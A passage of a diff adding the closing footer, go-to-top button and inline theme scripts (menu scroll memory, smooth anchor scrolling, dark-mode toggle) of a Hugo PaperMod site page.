+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
